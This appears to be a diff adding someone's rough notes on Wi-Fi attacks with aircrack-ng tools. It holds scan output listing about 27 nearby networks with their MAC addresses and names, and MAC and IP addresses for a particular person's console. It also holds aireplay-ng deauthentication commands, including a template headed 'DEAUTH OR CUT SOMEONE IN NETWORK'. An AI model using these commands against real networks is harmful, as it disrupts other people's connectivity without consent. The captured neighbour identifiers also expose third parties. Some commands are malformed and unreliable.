@@ -1,0 +1,80 @@
+iwlist <interface> scan
+
+Cell 02 - Address: A0:04:60:29:52:4F
+                    Channel:10
+                    Frequency:2.457 GHz (Channel 10)
+                    Quality=44/70  Signal level=-66 dBm  
+                    Encryption key:on
+                    ESSID:"ATT9u9xXk4_EXT"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11
+
+Cell 04 - Address: 14:ED:BB:FA:7B:A6
+                    Channel:10
+                    Frequency:2.457 GHz (Channel 10)
+                    Quality=41/70  Signal level=-69 dBm  
+                    Encryption key:on
+                    ESSID:"ATT9u9xXk4"
+
+
+CH  5 ][ Elapsed: 2 mins ][ 2017-06-12 16:42                                         
+                                                                                         
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                         
+ 14:ED:BB:FA:7B:A6  -13       95     1281    0  10  54e  WPA2 CCMP   PSK  ATT9u9xXk4     
+ A0:04:60:29:52:4F  -54      114       43    0  10  54e. WPA2 CCMP   PSK  ATT9u9xXk4_EXT 
+ A0:63:91:3E:12:DC  -65      124        0    0   7  54e  WPA2 CCMP   PSK  NETGEAR91      
+ 00:25:F0:61:93:0C  -73      101        2    0  10  54e. WPA2 CCMP   PSK  tl61930c       
+ 00:23:69:58:C3:63  -78       60       16    0   6  54e  WPA2 CCMP   PSK  T_L_Redel      
+ 10:0D:7F:DB:8C:B2  -78       47       30    0   1  54e  WPA2 CCMP   PSK  DB8CB2         
+ 38:70:0C:71:49:9A  -82       13        0    0  11  54e. WPA2 CCMP   PSK  71499A         
+ 10:0D:7F:66:56:D0  -82       34        1    0   1  54e. WPA2 CCMP   PSK  0WS8YI0Q       
+ 88:DE:A9:DF:0F:1B  -82       13        0    0   1  54e  WPA2 CCMP   PSK  <length: 22>   
+ FC:3F:DB:2B:F1:37  -83       29        0    0   6  54e  WPA2 CCMP   PSK  DIRECT-36-HP Of
+ 68:C9:0B:07:9D:81  -83       22        0    0   1  11e  WPA2 CCMP   PSK  SMA1990009880  
+ E4:F4:C6:07:26:E2  -84       13        1    0   1  54e  WPA2 CCMP   PSK  gustavo1       
+ E0:22:04:7F:D0:2E  -85       11        0    0   4  54e  WPA2 CCMP   PSK  ATT6I7Fd3D     
+ A0:63:91:3D:8D:48  -85       19        3    0   1  54e  WPA2 CCMP   PSK  NETGEAR87      
+ E0:B7:0A:AB:0C:70  -85       14        1    0  11  54e  WPA2 CCMP   PSK  ATTunXMSys     
+ C0:C5:22:01:DE:24  -85       28        0    0   6  54e. WPA2 CCMP   PSK  Family2324     
+ DC:7F:A4:63:E8:FA  -86       11        0    0   6  54e  WPA2 CCMP   PSK  ATT7J8Rls5     
+ 00:25:3C:EB:57:C9  -87        4        0    0   5  54 . WPA2 CCMP   PSK  2WIRE998       
+ AC:5D:10:45:73:36  -88       16        0    0   6  54e  WPA2 CCMP   PSK  ATT723         
+ C0:C5:22:03:65:BF  -89        4        0    0  11  54e. WPA2 CCMP   PSK  0365BF         
+ 00:25:9C:BF:C2:99  -89        6        0    0   6  54e  OPN              linksys        
+ 00:25:F0:A5:0C:30  -89        4        0    0   6  54e. WPA2 CCMP   PSK  tla50c30       
+ E4:83:99:7D:E7:03  -90        7        0    0  11  54e  WPA  TKIP   PSK  MOTOROLA-93D06 
+ 20:C9:D0:A5:99:3E  -91        2        0    0   1  54e. WPA2 CCMP   PSK  DodgerNet2     
+ C8:D3:FF:1A:9B:EA  -86        1        0    0   1  54e  WPA2 CCMP   PSK  DIRECT-E9-HP EN
+ 3C:DF:A9:88:36:70  -89        2        1    0  11  54e  WPA2 CCMP   PSK  Cody           
+ 14:91:82:6E:3B:A2  -90        4        0    0   6  54e  WPA2 CCMP   PSK  Beldar 2.4     
+
+this is my bssid:
+14:ED:BB:FA:7B:A6
+let run:
+	sudo airodump-ng --bssid 14:ED:BB:FA:7B:A6 wlan1mon
+Bin's PS4 is:
+	18:59:33:C6:04:6E
+	C0:38:96:E7:32:85
+
+	192.168.1.77
+	192.168.
+Has not shown up
+let try with my phone:
+	192.168.1.101
+using aireplay:
+	aireplay-ng -0 0 -a 14:ED:BB:FA:7B:A6 -k 192.168.1.77
+	
+some time we have to do multiple time because channel does not match
+
+airmon-ng start wlan1mon 10
+
+airodump-ng --bssid 14:ED:BB:FA:7B:A6 wlan1
+
+airodump-ng --bssid 88:DE:A9:DF:0F:1B wlan1
+
+DEAUTH OR CUT SOMEONE IN NETWORK
+aireplay-ng -0 0 -a <Mac of the AP> -c <Mac vic> wlan1
+
+sudo ifconfig wlan1 down
+
+
